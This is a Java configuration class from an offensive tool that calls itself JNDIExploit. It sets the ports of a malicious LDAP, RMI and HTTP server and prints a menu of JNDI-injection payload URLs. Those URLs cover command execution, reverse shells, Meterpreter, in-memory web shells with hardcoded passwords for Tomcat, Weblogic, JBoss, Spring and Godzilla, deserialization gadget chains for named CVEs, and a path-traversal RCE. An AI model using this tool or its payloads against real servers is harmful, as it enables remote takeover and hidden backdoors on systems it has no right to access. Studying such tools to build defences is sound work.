package com.feihong.ldap.utils;

import com.beust.jcommander.JCommander;
import com.beust.jcommander.Parameter;
import com.beust.jcommander.UnixStyleUsageFormatter;

public class Config {
    public static String codeBase;

    @Parameter(names = {"-i", "--ip"}, description = "Local ip address ", required = true, order = 1)
    public static String ip = "0.0.0.0";

    @Parameter(names = {"-l", "--ldapPort"}, description = "Ldap bind port", order = 2)
    public static int ldapPort = 1389;

    @Parameter(names = {"-rl", "--rmiPort"}, description = "rmi bind port", order = 2)
    public static int rmiPort = 10990;

    @Parameter(names = {"-p", "--httpPort"}, description = "Http bind port", order = 3)
    public static int httpPort = 3456;

    @Parameter(names = {"-u", "--usage"}, description = "Show usage", order = 5)
    public static boolean showUsage;

    @Parameter(names = {"-h", "--help"}, help = true, description = "Show this help")
    private static boolean help = false;

    @Parameter(names = {"-py", "--python"}, description = "Python System Command ex: python3  python2 ... ", order = 4)
    public static String python;


    public static String rhost;
    public static String rport;

    public static void applyCmdArgs(String[] args) {
        //process cmd args
        JCommander jc = JCommander.newBuilder()
                .addObject(new Config())
                .build();
        try{
            jc.parse(args);
        }catch(Exception e){
            if(!showUsage){
                System.out.println("Error: " + e.getMessage() + "\n");
                help = true;
            }
        }

        if(showUsage){
            String ip = (Config.ip != null) ? Config.ip : "[IP]";
            String port = (Config.ip != null) ? Config.ldapPort + "" : "[PORT]";

            System.out.println("Supported LADP Queries：");
            System.out.println("* all words are case INSENSITIVE when send to ldap server");
            String prefix = "ldap://" + Config.ip + ":" + Config.ldapPort + "/";
            System.out.println("\n[+] Basic Queries: " + prefix + "Basic/[PayloadType]/[Params], e.g.");
            System.out.println("    " + prefix + "Basic/Dnslog/[domain]");
            System.out.println("    " + prefix + "Basic/Command/[cmd]");
            System.out.println("    " + prefix + "Basic/Command/Base64/[base64_encoded_cmd]");
            System.out.println("    " + prefix + "Basic/ReverseShell/[ip]/[port]  ---windows NOT supported");
            System.out.println("    " + prefix + "Basic/TomcatEcho");
            System.out.println("    " + prefix + "Basic/SpringEcho");
            System.out.println("    " + prefix + "Basic/WeblogicEcho");
            System.out.println("    " + prefix + "Basic/TomcatMemshell1");
            System.out.println("    " + prefix + "Basic/TomcatMemshell2  ---need extra header [shell: true]");
            System.out.println("    " + prefix + "Basic/TomcatMemshell3  /ateam  pass1024");
            System.out.println("    " + prefix + "Basic/GodzillaMemshell /bteam.ico pass1024");
            System.out.println("    " + prefix + "Basic/JettyMemshell");
            System.out.println("    " + prefix + "Basic/WeblogicMemshell1");
            System.out.println("    " + prefix + "Basic/WeblogicMemshell2");
            System.out.println("    " + prefix + "Basic/JBossMemshell");
            System.out.println("    " + prefix + "Basic/WebsphereMemshell");
            System.out.println("    " + prefix + "Basic/SpringMemshell");

            System.out.println("\n[+] Deserialize Queries: " + prefix + "Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.");
            System.out.println("    " + prefix + "Deserialization/URLDNS/[domain]");
            System.out.println("    " + prefix + "Deserialization/CommonsCollectionsK1/Dnslog/[domain]");
            System.out.println("    " + prefix + "Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]");
            System.out.println("    " + prefix + "Deserialization/CommonsCollections6/Command/Base64/[base64_encoded_cmd]");
            System.out.println("    " + prefix + "Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported");
            System.out.println("    " + prefix + "Deserialization/CommonsBeanutils2/TomcatEcho");
            System.out.println("    " + prefix + "Deserialization/C3P0/SpringEcho");
            System.out.println("    " + prefix + "Deserialization/Jdk7u21/WeblogicEcho");
            System.out.println("    " + prefix + "Deserialization/Jre8u20/TomcatMemshell");
            System.out.println("    " + prefix + "Deserialization/CVE_2020_2555/WeblogicMemshell1");
            System.out.println("    " + prefix + "Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells");

            System.out.println("\n[+] TomcatBypass Queries");
            System.out.println("    " + prefix + "TomcatBypass/Dnslog/[domain]");
            System.out.println("    " + prefix + "TomcatBypass/Command/[cmd]");
            System.out.println("    " + prefix + "TomcatBypass/Command/Base64/[base64_encoded_cmd]");
            System.out.println("    " + prefix + "TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported");
            System.out.println("    " + prefix + "TomcatBypass/TomcatEcho");
            System.out.println("    " + prefix + "TomcatBypass/SpringEcho");
            System.out.println("    " + prefix + "TomcatBypass/TomcatMemshell1");
            System.out.println("    " + prefix + "TomcatBypass/TomcatMemshell2  ---need extra header [shell: true]");
            System.out.println("    " + prefix + "TomcatBypass/TomcatMemshell3  /ateam  pass1024");
            System.out.println("    " + prefix + "TomcatBypass/GodzillaMemshell /bteam.ico pass1024");
            System.out.println("    " + prefix + "TomcatBypass/SpringMemshell");
            System.out.println("    " + prefix + "TomcatBypass/Meterpreter/[ip]/[port]  ---java/meterpreter/reverse_tcp");

            System.out.println("\n[+] GroovyBypass Queries");
            System.out.println("    " + prefix + "GroovyBypass/Command/[cmd]");
            System.out.println("    " + prefix + "GroovyBypass/Command/Base64/[base64_encoded_cmd]");

            System.out.println("\n[+] WebsphereBypass Queries");
            System.out.println("    " + prefix + "WebsphereBypass/List/file=[file or directory]");
            System.out.println("    " + prefix + "WebsphereBypass/Upload/Dnslog/[domain]");
            System.out.println("    " + prefix + "WebsphereBypass/Upload/Command/[cmd]");
            System.out.println("    " + prefix + "WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]");
            System.out.println("    " + prefix + "WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported");
            System.out.println("    " + prefix + "WebsphereBypass/Upload/WebsphereMemshell");
            System.out.println("    " + prefix + "WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp");
            System.out.println("以上可以将 <ldap://> 替换为 <rmi://>");

            System.exit(0);
        }

//        //获取当前 Jar 的名称
//        String jarPath = Starter.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        jc.setProgramName("java -jar JNDIExploit-1.2-SNAPSHOT.jar");
        jc.setUsageFormatter(new UnixStyleUsageFormatter(jc));

        if(help) {
            jc.usage(); //if -h specified, show help and exit
            System.exit(0);
        }

        // 特别注意：最后一个反斜杠不能少啊
        Config.codeBase = "http://" + Config.ip + ":" + Config.httpPort + "/";
    }
}
